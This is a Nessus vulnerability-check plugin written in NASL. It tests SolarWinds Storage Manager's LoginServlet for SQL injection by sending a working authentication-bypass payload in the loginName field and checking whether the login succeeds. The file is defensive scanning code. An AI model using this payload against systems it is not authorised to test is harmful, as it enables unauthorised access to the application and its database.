#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59116);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/12/21 21:55:05 $");

  script_bugtraq_id(51639);
  script_osvdb_id(81634);
  script_xref(name:"EDB-ID", value:"18818");

  script_name(english:"SolarWinds Storage Manager Server LoginServlet loginName Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication via SQL Injection");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host is running a web application with a SQL injection
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of SolarWinds Storage Manager running on the remote host
has a SQL injection vulnerability in the 'loginName' parameter of the
'LoginServlet' page.  An attacker can leverage this flaw to bypass
authentication, execute arbitrary SQL commands on the underlying
database, and possibly compromise the database server host operating
system."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/521328/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ebb7ec6a");
  script_set_attribute(
    attribute:"solution",
    value:
"Either apply the hotfix for version 5.1.2 or upgrade to version 5.2
or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"SolarWinds Storage Manager 5.1.2 SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Solarwinds Storage Manager 5.1.0 SQL Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/01/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/02/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:solarwinds:storage_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("solarwinds_storagemanager_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/solarwinds_storage_manager");
  script_require_ports("Services/www", 9000);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:9000);

install = get_install_from_kb(appname:'solarwinds_storage_manager', port:port, exit_on_fail:TRUE);

dir = install['dir'];
url = build_url(qs:dir, port:port);
appname = "SolarWinds Storage Manager";

postdata =
  'loginName=\'or 1=1#--&' + # sql injection
  'password=OHAI&' +
  'loginState=checkLogin';

res = http_send_recv3(port:port, method: 'POST',
        item: dir + "/LoginServlet", data: postdata,
        content_type: "application/x-www-form-urlencoded",
        exit_on_fail: TRUE 
      );

# see if login is successful
if (
  "Left Navigation Menu" >< res[2] &&
  "Main Content" >< res[2]
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report = 
      '\nNessus was able to bypass authentication via SQL Injection with the\n' +
      'following HTTP Request : \n\n' + http_last_sent_request() + '\n';
    security_hole(port:port, extra: report);
  } 
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url);
